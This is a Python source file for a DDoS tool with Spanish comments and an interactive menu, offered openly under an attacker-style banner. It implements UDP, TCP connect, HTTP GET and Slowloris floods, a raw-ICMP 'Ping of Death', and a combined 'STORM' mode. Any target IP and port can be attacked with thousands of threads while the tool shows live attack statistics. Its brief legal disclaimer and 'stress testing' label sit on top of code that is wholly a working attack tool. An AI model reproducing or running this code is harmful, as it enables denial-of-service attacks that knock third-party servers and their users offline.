import socket
import threading
import random
import time
import os
import sys
import argparse
from colorama import Fore, Style, init

# Inicialización mejorada de colorama
init(autoreset=True)
os.system('cls' if os.name == 'nt' else 'clear')

BANNER = f"""{Fore.RED}
 ▄▄· ▄• ▄▌ ▄▄▄· ▄ •▄ ▄▄▄ .▄▄▄  .▄▄ · ·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
▐█ ▌▪█▪██▌▐█ ▀█ █▌▄▌▪▀▄.▀·▀▄ █·▐█ ▀. ██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
██ ▄▄█▌▐█▌▄█▀▀█ ▐▀▀▄·▐▀▀▪▄▐▀▀▄ ▄▀▀▀█▄▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
▐███▌▐█▄█▌▐█ ▪▐▌▐█.█▌▐█▄▄▌▐█•█▌▐█▄▪▐███. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
·▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀ ▀▀▀ .▀  ▀ ▀▀▀▀ ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 
                                                                                
    {Style.RESET_ALL}{Fore.LIGHTBLACK_EX} DDoS Tool | Versión 2.0 | Author: BloodyZeZe

"""

# Configuración global con valores predeterminados
config = {
    "target_ip": "",
    "target_port": 80,
    "threads": 100,
    "packet_size": 1024,
    "attack_mode": "udp",
    "random_port": False,
    "timeout": 1,
    "duration": 0,  # 0 = indefinido
    "verbose": True
}

# Lista ampliada de user agents para ser más realista
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/106.0.1370.47 Safari/537.36",
]

# Estadísticas globales
stats = {
    "packets_sent": 0,
    "bytes_sent": 0,
    "connections": 0,
    "start_time": 0,
    "running": False
}

# Control para todos los hilos
stop_event = threading.Event()

# === FUNCIONES AUXILIARES ===

def log(message, level="info"):
    """Registra mensajes con nivel de verbosidad"""
    if not config["verbose"] and level != "error":
        return
    
    color_map = {
        "info": Fore.CYAN,
        "success": Fore.GREEN,
        "warning": Fore.YELLOW,
        "error": Fore.RED
    }
    
    prefix_map = {
        "info": "[*]",
        "success": "[+]",
        "warning": "[!]",
        "error": "[×]"
    }
    
    print(f"{color_map.get(level, Fore.WHITE)}{prefix_map.get(level, '[*]')} {message}")

def update_stats(packets=0, bytes_sent=0, connections=0):
    """Actualiza las estadísticas de ataque de forma segura"""
    with threading.Lock():
        stats["packets_sent"] += packets
        stats["bytes_sent"] += bytes_sent
        stats["connections"] += connections

def display_stats():
    """Muestra estadísticas del ataque en tiempo real"""
    elapsed = time.time() - stats["start_time"]
    packets_per_second = stats["packets_sent"] / elapsed if elapsed > 0 else 0
    mb_sent = stats["bytes_sent"] / (1024 * 1024)
    mb_per_second = mb_sent / elapsed if elapsed > 0 else 0
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    print(f"{Fore.CYAN}=== ESTADÍSTICAS DE ATAQUE ===")
    print(f"{Fore.GREEN}Objetivo:           {config['target_ip']}:{config['target_port']}")
    print(f"{Fore.GREEN}Modo de ataque:     {config['attack_mode'].upper()}")
    print(f"{Fore.GREEN}Tiempo transcurrido: {elapsed:.2f} segundos")
    print(f"{Fore.GREEN}Paquetes enviados:  {stats['packets_sent']:,}")
    print(f"{Fore.GREEN}Velocidad:          {packets_per_second:.2f} paquetes/seg")
    print(f"{Fore.GREEN}Datos enviados:     {mb_sent:.2f} MB")
    print(f"{Fore.GREEN}Ancho de banda:     {mb_per_second:.2f} MB/seg")
    if config['attack_mode'] in ['syn', 'http', 'slowloris']:
        print(f"{Fore.GREEN}Conexiones:        {stats['connections']:,}")
    print(f"\n{Fore.YELLOW}Presiona Ctrl+C para detener el ataque...")

# === FUNCIONES DE ATAQUE ===

def udp_flood():
    """Ataque de inundación UDP mejorado con manejo de errores"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while not stop_event.is_set():
        payload = random._urandom(config["packet_size"])
        port = random.randint(1, 65535) if config["random_port"] else config["target_port"]
        try:
            sock.sendto(payload, (config["target_ip"], port))
            update_stats(packets=1, bytes_sent=config["packet_size"])
        except (socket.error, OSError) as e:
            continue

def syn_flood():
    """Ataque SYN Flood mejorado con sockets raw si es posible (requiere privilegios)"""
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(config["timeout"])
            s.connect((config["target_ip"], config["target_port"]))
            payload = random._urandom(64)
            s.send(payload)
            update_stats(packets=1, bytes_sent=64, connections=1)
            s.close()
        except (socket.error, OSError):
            continue

def http_flood():
    """Ataque HTTP Flood mejorado con cabeceras más realistas"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(config["timeout"])
            sock.connect((config["target_ip"], config["target_port"]))
            
            # Construir un request HTTP más realista
            user_agent = random.choice(USER_AGENTS)
            paths = ['/', '/index.html', '/api/v1/status', '/about', '/contact', '/login']
            path = random.choice(paths)
            
            http_request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {config['target_ip']}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml\r\n"
                f"Accept-Language: en-US,en;q=0.9,es;q=0.8\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: max-age=0\r\n"
                f"\r\n"
            )
            
            sock.send(http_request.encode())
            update_stats(packets=1, bytes_sent=len(http_request), connections=1)
            sock.close()
        except (socket.error, OSError):
            continue

def slowloris():
    """Ataque Slowloris mejorado con reintentos y gestión de conexiones"""
    sockets_list = []
    max_sockets = config["threads"]
    
    while not stop_event.is_set():
        # Mantener pool de conexiones en el nivel deseado
        while len(sockets_list) < max_sockets and not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(config["timeout"])
                s.connect((config["target_ip"], config["target_port"]))
                s.send("GET / HTTP/1.1\r\n".encode())
                s.send(f"Host: {config['target_ip']}\r\n".encode())
                s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
                s.send("Accept-Language: en-US,en;q=0.9\r\n".encode())
                sockets_list.append(s)
                update_stats(connections=1)
            except (socket.error, OSError):
                # Si no se puede establecer la conexión, intentar con el siguiente
                continue
        
        # Enviar datos parciales a todas las conexiones existentes
        for s in list(sockets_list):
            try:
                # Enviar una cabecera incompleta para mantener la conexión abierta
                header = "X-a: {}\r\n".format(random.randint(1, 5000))
                s.send(header.encode())
                update_stats(packets=1, bytes_sent=len(header))
            except (socket.error, OSError):
                # Si la conexión está cerrada, eliminarla de la lista
                sockets_list.remove(s)
                continue
                
        # Pequeña pausa para dar tiempo al servidor para procesar las solicitudes
        time.sleep(0.1)

def ping_of_death():
    """Implementación simple de Ping of Death"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(config["timeout"])
            payload = random._urandom(65500)  # Tamaño cercano al límite
            sock.sendto(payload, (config["target_ip"], 0))
            update_stats(packets=1, bytes_sent=len(payload))
        except (socket.error, OSError, PermissionError):
            # Falla silenciosa si no hay permisos
            time.sleep(0.5)
            continue

def combo_storm():
    """Ejecuta todos los ataques disponibles simultáneamente"""
    attack_threads = []
    attack_funcs = [udp_flood, syn_flood, http_flood, slowloris]
    
    # Crear hilos para cada tipo de ataque
    for func in attack_funcs:
        # Dividir los hilos entre los diferentes ataques
        threads_per_attack = max(1, config["threads"] // len(attack_funcs))
        for _ in range(threads_per_attack):
            t = threading.Thread(target=func)
            t.daemon = True
            attack_threads.append(t)
            t.start()
    
    # Unirse a todos los hilos cuando se detiene el ataque
    while not stop_event.is_set():
        time.sleep(0.1)

def start_attack():
    """Inicia el ataque con la configuración actual"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    log(f"Iniciando ataque: {config['attack_mode'].upper()} contra {config['target_ip']}:{config['target_port']} usando {config['threads']} hilos", "success")
    
    # Mapeo de modos de ataque a funciones
    func_map = {
        "udp": udp_flood,
        "syn": syn_flood,
        "http": http_flood,
        "slowloris": slowloris,
        "pod": ping_of_death,
        "storm": combo_storm
    }

    attack_func = func_map.get(config["attack_mode"], udp_flood)
    
    # Resetear estadísticas
    stats["packets_sent"] = 0
    stats["bytes_sent"] = 0
    stats["connections"] = 0
    stats["start_time"] = time.time()
    stats["running"] = True
    stop_event.clear()
    
    # Lanzar hilos de ataque
    if config["attack_mode"] != "storm":
        for _ in range(config["threads"]):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()
    else:
        # Para storm, la función se encarga de distribuir los hilos
        t = threading.Thread(target=attack_func)
        t.daemon = True
        t.start()
    
    # Hilo para mostrar estadísticas en tiempo real
    stats_thread = threading.Thread(target=stats_display_loop)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Si hay una duración configurada, programar la finalización
    if config["duration"] > 0:
        log(f"Ataque programado para {config['duration']} segundos", "info")
        threading.Timer(config["duration"], stop_attack).start()
    
    # Bucle principal para capturar Ctrl+C
    try:
        while stats["running"]:
            time.sleep(0.1)
    except KeyboardInterrupt:
        stop_attack()

def stats_display_loop():
    """Actualiza la pantalla con estadísticas en tiempo real"""
    while stats["running"] and not stop_event.is_set():
        display_stats()
        time.sleep(1)

def stop_attack():
    """Detiene todos los hilos de ataque"""
    log("Deteniendo ataque...", "warning")
    stop_event.set()
    stats["running"] = False
    
    # Mostrar estadísticas finales
    elapsed = time.time() - stats["start_time"]
    log(f"Ataque finalizado. Duración: {elapsed:.2f} segundos", "success")
    log(f"Paquetes enviados: {stats['packets_sent']:,}", "success")
    log(f"Datos enviados: {stats['bytes_sent'] / (1024 * 1024):.2f} MB", "success")

def validate_ip(ip):
    """Valida que la IP tenga un formato correcto"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port):
    """Valida que el puerto esté en el rango correcto"""
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False

def config_menu():
    """Menú interactivo de configuración"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    
    # Solicitar IP objetivo
    while True:
        config["target_ip"] = input(f"{Fore.CYAN}IP del objetivo: ").strip()
        if validate_ip(config["target_ip"]):
            break
        log("IP inválida. Introduce una dirección IP válida.", "error")
    
    # Solicitar puerto objetivo
    while True:
        port_input = input(f"{Fore.CYAN}Puerto objetivo [default 80]: ").strip() or "80"
        if validate_port(port_input):
            config["target_port"] = int(port_input)
            break
        log("Puerto inválido. Introduce un número entre 1 y 65535.", "error")
    
    # Solicitar número de hilos
    threads_input = input(f"{Fore.CYAN}Cantidad de hilos [default 100]: ").strip() or "100"
    try:
        config["threads"] = max(1, min(5000, int(threads_input)))
    except ValueError:
        log("Valor de hilos inválido. Usando valor predeterminado: 100", "warning")
        config["threads"] = 100
    
    # Solicitar tamaño de paquete
    packet_size_input = input(f"{Fore.CYAN}Tamaño paquete UDP [default 1024]: ").strip() or "1024"
    try:
        config["packet_size"] = max(64, min(65507, int(packet_size_input)))
    except ValueError:
        log("Valor de tamaño de paquete inválido. Usando valor predeterminado: 1024", "warning")
        config["packet_size"] = 1024
    
    # Solicitar duración del ataque
    duration_input = input(f"{Fore.CYAN}Duración del ataque en segundos [0=indefinido]: ").strip() or "0"
    try:
        config["duration"] = max(0, int(duration_input))
    except ValueError:
        log("Valor de duración inválido. Usando valor predeterminado: indefinido", "warning")
        config["duration"] = 0
    
    # Solicitar modo de ataque
    print(f"{Fore.CYAN}\nSelecciona el modo de ataque:")
    print(f"{Fore.WHITE} [1] UDP Flood - Inundación de paquetes UDP")
    print(f"{Fore.WHITE} [2] TCP SYN Flood - Inundación de conexiones TCP")
    print(f"{Fore.WHITE} [3] HTTP GET Flood - Inundación de peticiones HTTP")
    print(f"{Fore.WHITE} [4] Slowloris - Ataque de agotamiento de conexiones")
    print(f"{Fore.WHITE} [5] Ping of Death - Paquetes ICMP sobrecargados")
    print(f"{Fore.WHITE} [6] 💀 Modo STORM (todos combinados)")
    
    attack_opt = input(f"{Fore.CYAN} --> ").strip()
    config["attack_mode"] = {
        "1": "udp", 
        "2": "syn", 
        "3": "http", 
        "4": "slowloris", 
        "5": "pod",
        "6": "storm"
    }.get(attack_opt, "udp")
    
    # Solicitar si se debe randomizar el puerto
    rand_port = input(f"{Fore.CYAN}\n¿Randomizar puerto destino? (s/n) [n]: ").strip().lower()
    config["random_port"] = rand_port == "s"
    
    # Solicitar nivel de verbosidad
    verbose = input(f"{Fore.CYAN}\n¿Mostrar estadísticas detalladas? (s/n) [s]: ").strip().lower() or "s"
    config["verbose"] = verbose != "n"
    
    # Advertencia legal
    print(f"\n{Fore.RED}[!] ADVERTENCIA: Usar esta herramienta contra sistemas sin autorización es ILEGAL.")
    print(f"{Fore.RED}[!] El autor no se hace responsable del mal uso de esta herramienta.")
    print(f"{Fore.RED}[!] Úsala bajo tu propia responsabilidad y solo con fines educativos.")
    
    confirmation = input(f"\n{Fore.YELLOW}¿Deseas continuar? (s/n): ").strip().lower()
    if confirmation != "s":
        print(f"{Fore.GREEN}Operación cancelada. Saliendo...")
        sys.exit(0)
    
    # Iniciar ataque
    start_attack()

def parse_arguments():
    """Procesa argumentos de línea de comandos para modo no interactivo"""
    parser = argparse.ArgumentParser(description="Herramienta avanzada de pruebas de estrés de red")
    parser.add_argument("-t", "--target", help="IP del objetivo")
    parser.add_argument("-p", "--port", type=int, default=80, help="Puerto del objetivo (default: 80)")
    parser.add_argument("-m", "--mode", choices=["udp", "syn", "http", "slowloris", "pod", "storm"], 
                        default="udp", help="Modo de ataque (default: udp)")
    parser.add_argument("-c", "--threads", type=int, default=100, help="Número de hilos (default: 100)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Tamaño de paquete (default: 1024)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Duración en segundos, 0=indefinido (default: 0)")
    parser.add_argument("-r", "--random", action="store_true", help="Randomizar puerto destino")
    parser.add_argument("-q", "--quiet", action="store_true", help="Modo silencioso (sin estadísticas)")
    
    args = parser.parse_args()
    
    # Si se proporciona el objetivo, usar modo no interactivo
    if args.target:
        config["target_ip"] = args.target
        config["target_port"] = args.port
        config["threads"] = args.threads
        config["packet_size"] = args.size
        config["attack_mode"] = args.mode
        config["random_port"] = args.random
        config["duration"] = args.duration
        config["verbose"] = not args.quiet
        return True
    
    return False

# === EJECUCIÓN PRINCIPAL ===
if __name__ == "__main__":
    try:
        # Intentar cargar argumentos de la línea de comandos
        if parse_arguments():
            start_attack()
        else:
            config_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Operación cancelada por el usuario.")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}")
        sys.exit(1)